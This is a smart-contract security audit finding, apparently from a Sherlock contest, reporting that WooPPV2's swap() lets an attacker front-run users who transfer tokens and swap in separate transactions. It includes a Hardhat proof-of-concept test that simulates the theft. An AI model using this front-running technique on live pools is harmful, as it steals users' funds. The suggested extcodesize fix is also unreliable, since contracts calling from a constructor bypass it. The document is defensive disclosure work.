### by [CarlosAlegreUr](https://github.com/CarlosAlegreUr)

## Summary

EOAs swapping on WooPPV2 can be front-run so they lose their swapped funds and receive nothing.

> 📘 **Note** ℹ️: Also SmartContract addresses can suffer from this if they `transfer()` tokens and later
> `swap()` in 2 different transactions.

---

## Vulnerability Detail

The protocol allows for anyone to directly call to `WooPPV2`'s `swap()` but an EOA who uses it could get front-run and all his swapping funds could be stolen.

The user would `transfer()` the `from-token` he wants to get rid of to the pool and then call the `swap()` function to receive its `to-token` corresponding amount. But another user sees this and front-runs his swap with an identical one and, as the funds are already in the pool, the pool will detect it as a valid `swap()` and send the `to-tokens` to the front-runner's address.

This are the specific checks that will return true as the contract has received the funds:

- [At _sellBase()](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L431)

```solidity
  require(balance(baseToken) - tokenInfos[baseToken].reserve >= baseAmount, "WooPPV2: !BASE");
```

- [At _sellQuote()](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L478)

- [At _swapBaseToBase()](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L525)

And the execution will continue with the front-runner being able to chose the receiver of the swap with the only cost of gas fees.

## Impact

The impact is that valid users will lose their funds and receive nothing in return.

---

## Code Snippet

To run it, paste this test in the `./test/typescript/WooPPv2.test.ts` file, inside the `describe("wooPP swap", () => {})` test cases section, after the `beforeEach("Deploy WooPPV2", async () => {})` and run:

```bash
npx hardhat test test/typescript/WooPPv2.test.ts
```

<details> <summary> See code 👁️ </summary>

```typescript
    it.only("Front-run exploit", async () => {
      await btcToken.mint(user1.address, ONE.mul(3));
      const baseAmount = ONE.mul(1);
      const minQuoteAmount = ONE.mul(BTC_PRICE).mul(99).div(100);

      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      let userUsdt = await usdtToken.balanceOf(user1.address);
      let userBtc = await btcToken.balanceOf(user1.address);
      let userUsdt2 = await usdtToken.balanceOf(user2.address);
      let userBtc2 = await btcToken.balanceOf(user2.address);
      let wppUsdtSize = await wooPP.poolSize(usdtToken.address);
      let unclaimedFee = await wooPP.unclaimedFee();
      console.log("BEFORE SWAP");
      console.log("user1 usdt: ", utils.formatEther(userUsdt));
      console.log("user1 btc: ", utils.formatEther(userBtc));
      console.log("user2 usdt: ", utils.formatEther(userUsdt2));
      console.log("user2 btc: ", utils.formatEther(userBtc2));
      console.log("balanceOf WooPP usdt: ", (await usdtToken.balanceOf(wooPP.address)).div(ONE).toString());
      console.log("balanceOf WooPP btc: ", (await btcToken.balanceOf(wooPP.address)).div(ONE).toString());

      // User1 sends fromToken (btc now) to pool
      await btcToken.connect(user1).approve(wooPP.address, baseAmount);
      await btcToken.connect(user1).transfer(wooPP.address, baseAmount);

      console.log("User1 has sent btc to WooPP");
      console.log("user1 btc: ", utils.formatEther(await btcToken.balanceOf(user1.address)));
      console.log("balanceOf WooPP btc: ", (await btcToken.balanceOf(wooPP.address)).div(ONE).toString());

      console.log("User1 sends a swap to receive its usdt");
      console.log("User2 sees it and front-runs with the same swap but the `to` address is its own");

      // User2 sees the transaction and frontruns user1 with a swap tx before the swap of user1
      await wooPP
        .connect(user2)
        .swap(btcToken.address, quote.address, baseAmount, minQuoteAmount, user2.address, ZERO_ADDR);

      // User1 tries to swap but he has been front-run by user2 and reverts
      await expect(
        wooPP.connect(user1).swap(btcToken.address, quote.address, baseAmount, minQuoteAmount, user1.address, ZERO_ADDR)
      ).to.be.revertedWith("WooPPV2: !BASE");

      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      userUsdt = await usdtToken.balanceOf(user1.address);
      userBtc = await btcToken.balanceOf(user1.address);
      userUsdt2 = await usdtToken.balanceOf(user2.address);
      userBtc2 = await btcToken.balanceOf(user2.address);
      console.log("AFTER SWAP");
      console.log("user1 usdt: ", utils.formatEther(userUsdt));
      console.log("user1 btc: ", utils.formatEther(userBtc));
      console.log("user2 usdt: ", utils.formatEther(userUsdt2));
      console.log("user2 btc: ", utils.formatEther(userBtc2));
      console.log("balance WooPP usdt: ", (await usdtToken.balanceOf(wooPP.address)).div(ONE).toString());
      console.log("balance WooPP btc: ", (await btcToken.balanceOf(wooPP.address)).div(ONE).toString());
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
      console.log("++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
    });
```

 </details>

---

## Tool used

- Manual review.
  
---

## Recommendation

Restrict EOAs from interacting with the `WooPPV2`'s `swap()` function. Only allow contracts to do so by checking the codesize of `msg.sender`.

```solidity
function isEOA() public view returns (bool) {
   uint256 size;
   assembly {
       size := extcodesize(msg.sender)
   }
   return size == 0;
}
```

---
